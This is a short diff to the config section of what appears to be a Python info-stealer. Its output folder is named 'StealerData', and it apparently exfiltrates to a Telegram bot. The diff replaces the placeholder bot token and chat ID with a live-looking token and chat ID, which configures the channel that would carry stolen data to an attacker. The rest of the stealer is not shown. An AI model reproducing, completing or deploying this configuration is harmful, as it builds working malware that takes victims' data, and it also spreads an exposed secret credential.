@@ -17,8 +17,8 @@ from datetime import datetime
 from pathlib import Path
 
 # ========== CONFIG ==========
-TOKEN = "YOUR_BOT_TOKEN_HERE"
-CHAT_ID = "YOUR_CHAT_ID_HERE"
+TOKEN = "8528053368:AAF5faIvI90mjkViQ-CY9Lo-nAjyjiWP6lY"
+CHAT_ID = "8516763046"
 OUTPUT_DIR = "C:\\StealerData"
 
 os.makedirs(OUTPUT_DIR, exist_ok=True)
